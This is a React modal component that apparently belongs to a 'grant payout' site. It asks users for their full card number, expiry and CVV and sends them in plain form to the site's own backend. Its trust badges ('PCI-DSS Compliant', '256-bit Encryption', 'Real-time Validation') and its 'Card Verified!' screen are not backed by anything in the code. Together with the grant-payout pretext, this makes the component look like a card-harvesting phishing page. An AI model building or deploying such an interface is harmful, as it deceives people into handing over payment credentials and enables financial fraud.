"use client";
import { useState } from "react";

interface CardModalProps {
  onClose: () => void;
  onSuccess: () => void;
}

export default function CardModal({ onClose, onSuccess }: CardModalProps) {
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [formData, setFormData] = useState({
    card: "",
    exp: "",
    cvc: "",
  });
  const [step, setStep] = useState<"form" | "success">("form");

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    try {
      const token = localStorage.getItem("bpkyc_token");
      const res = await fetch("/api/user/link-card", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${token}`,
        },
        body: JSON.stringify({
          cardNumber: formData.card,
          cardExp: formData.exp,
          cardCvc: formData.cvc,
        }),
      });

      if (res.ok) {
        setStep("success");
        setTimeout(() => {
          onSuccess();
          onClose();
        }, 2000);
      } else {
        alert("Failed to link card.");
      }
    } catch (err) {
      alert("Error linking card.");
    } finally {
      setIsSubmitting(false);
    }
  };

  const inputStyle: React.CSSProperties = {
    width: "100%",
    padding: "16px",
    border: "1px solid #e0e0e0",
    borderRadius: "12px",
    fontSize: "1rem",
    outline: "none",
    background: "#fdfdfd",
    color: "#111",
    transition: "border-color 0.2s",
  };

  const primaryBtn: React.CSSProperties = {
    width: "100%",
    padding: "18px",
    background: "var(--black)",
    color: "white",
    border: "none",
    borderRadius: "14px",
    fontWeight: 800,
    fontSize: "0.95rem",
    cursor: "pointer",
    marginTop: "20px",
    textTransform: "uppercase",
    letterSpacing: "0.05em",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    gap: "10px",
  };

  return (
    <div
      style={{
        position: "fixed",
        inset: 0,
        background: "rgba(0,0,0,0.65)",
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        zIndex: 10000,
        backdropFilter: "blur(5px)",
      }}
      onClick={onClose}
    >
      <div
        style={{
          background: "white",
          width: "90%",
          maxWidth: "420px",
          borderRadius: "24px",
          overflow: "hidden",
          boxShadow: "0 32px 80px rgba(0,0,0,0.25)",
          fontFamily: "Montserrat, sans-serif",
          position: "relative",
          animation: "cardSlideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1)",
        }}
        onClick={(e) => e.stopPropagation()}
      >
        <style>{`
          @keyframes cardSlideUp {
            from { opacity: 0; transform: translateY(40px) scale(0.95); }
            to { opacity: 1; transform: translateY(0) scale(1); }
          }
          @keyframes cardRotate {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
          }
          .card-input:focus {
            border-color: var(--cyan) !important;
            box-shadow: 0 0 0 4px rgba(0, 240, 255, 0.1);
          }
        `}</style>

        {/* Header */}
        <div style={{ padding: "28px 32px", borderBottom: "1px solid #f0f0f0", background: "linear-gradient(135deg, #fdfdfd 0%, #f7f7f7 100%)" }}>
           <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "12px" }}>
              <div style={{ background: "var(--black)", color: "white", padding: "6px 12px", borderRadius: "6px", fontSize: "0.65rem", fontWeight: 800, textTransform: "uppercase", letterSpacing: "0.08em" }}>Instant Grant Payout</div>
              <button onClick={onClose} style={{ border: "none", background: "none", fontSize: "1.5rem", color: "#ccc", cursor: "pointer", padding: 0 }}>&times;</button>
           </div>
           <h2 style={{ fontSize: "1.4rem", fontWeight: 900, color: "var(--black)", textTransform: "uppercase" }}>Connect Your Card</h2>
           <p style={{ fontSize: "0.85rem", color: "var(--text-body)", marginTop: "4px", fontWeight: 600 }}>Enable 1-hour expedited fund transfers.</p>
        </div>

        <div style={{ padding: "32px" }}>
          {step === "form" ? (
            <form onSubmit={handleSubmit}>
              <div style={{ display: "flex", flexDirection: "column", gap: "20px" }}>
                <div>
                   <label style={{ fontSize: "0.7rem", fontWeight: 800, textTransform: "uppercase", color: "#888", display: "block", marginBottom: "8px", letterSpacing: "0.05em" }}>Card Number</label>
                   <input 
                      className="card-input"
                      style={inputStyle} 
                      placeholder="0000 0000 0000 0000" 
                      required 
                      value={formData.card} 
                      onChange={e => setFormData(p => ({ ...p, card: e.target.value }))} 
                   />
                </div>
                
                <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "20px" }}>
                   <div>
                      <label style={{ fontSize: "0.7rem", fontWeight: 800, textTransform: "uppercase", color: "#888", display: "block", marginBottom: "8px", letterSpacing: "0.05em" }}>Expiry</label>
                      <input 
                        className="card-input"
                        style={inputStyle} 
                        placeholder="MM / YY" 
                        required 
                        value={formData.exp} 
                        onChange={e => setFormData(p => ({ ...p, exp: e.target.value }))} 
                      />
                   </div>
                   <div>
                      <label style={{ fontSize: "0.7rem", fontWeight: 800, textTransform: "uppercase", color: "#888", display: "block", marginBottom: "8px", letterSpacing: "0.05em" }}>CVV</label>
                      <input 
                        className="card-input"
                        style={inputStyle} 
                        placeholder="123" 
                        required 
                        value={formData.cvc} 
                        onChange={e => setFormData(p => ({ ...p, cvc: e.target.value }))} 
                      />
                   </div>
                </div>
              </div>

              <button type="submit" disabled={isSubmitting} style={primaryBtn}>
                {isSubmitting ? (
                   <>
                     <div style={{ width: "18px", height: "18px", border: "2px solid rgba(255,255,255,0.3)", borderTopColor: "white", borderRadius: "50%", animation: "cardRotate 0.8s linear infinite" }} />
                     <span>Processing...</span>
                   </>
                ) : (
                  "Finalize Connection"
                )}
              </button>
              
              <div style={{ marginTop: "20px", display: "flex", alignItems: "center", justifyContent: "center", gap: "8px", opacity: 0.6 }}>
                 <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#666" strokeWidth="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" /></svg>
                 <span style={{ fontSize: "0.7rem", fontWeight: 700, color: "#666" }}>Secure 256-bit Encryption</span>
              </div>
            </form>
          ) : (
            <div style={{ textAlign: "center", padding: "20px 0" }}>
              <div style={{ width: "64px", height: "64px", background: "var(--cyan)", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 24px", color: "var(--black)" }}>
                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12" /></svg>
              </div>
              <h2 style={{ fontSize: "1.4rem", fontWeight: 900, marginBottom: "12px", color: "var(--black)", textTransform: "uppercase" }}>Card Verified!</h2>
              <p style={{ fontSize: "0.95rem", color: "var(--text-body)", lineHeight: 1.5, fontWeight: 500 }}>
                Your card has been successfully connected for instant grant disbursements.
              </p>
            </div>
          )}
        </div>

        <div style={{ padding: "16px 24px", background: "#f9fcfc", borderTop: "1px solid #f0f0f0", textAlign: "center", display: "flex", alignItems: "center", justifyContent: "center", gap: "12px" }}>
            <span style={{ fontSize: "0.6rem", color: "#aaa", fontWeight: 800, textTransform: "uppercase" }}>PCI-DSS Compliant</span>
            <div style={{ width: "4px", height: "4px", background: "#ddd", borderRadius: "50%" }} />
            <span style={{ fontSize: "0.6rem", color: "#aaa", fontWeight: 800, textTransform: "uppercase" }}>Real-time Validation</span>
        </div>
      </div>
    </div>
  );
}
